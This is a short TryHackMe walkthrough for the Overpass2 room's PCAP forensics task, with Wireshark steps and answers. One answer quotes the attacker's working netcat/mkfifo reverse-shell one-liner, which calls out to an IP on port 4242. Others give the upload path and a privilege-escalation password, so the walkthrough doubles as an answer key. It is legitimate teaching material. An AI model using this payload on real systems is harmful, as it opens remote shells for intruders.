# Overpass2 Walkthrough
### Link
- https://tryhackme.com/room/overpass2hacked
---
### Task 1  Forensics - Analyse the PCAP
**Question**
###### What was the URL of the page they used to upload a reverse shell?
```
Download and Open pcap

Right click on the first packet --> Select Follow --> TCP Stream
```
[Overpass2_1](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_1.png) , [Overpass2_2](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_2.png)

**Answer**
###### /development/

**Question**
###### What payload did the attacker use to gain access?

Right click on the second packet --> Select Follow --> TCP Stream 

**Answer**
###### exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")

**Question**
###### What password did the attacker use to privesc?

Now let's use another method. We search in the entire capture the keyword : *password*

For that: 

- click on the search icon --> select Packet bytes
- *Don't check Case sensitive*
- Select String
- indicate the string you want to find: password

When you found the packet, Right click --> Select Follow --> TCP Stream

**Answer**
######  whenevernoteartinstant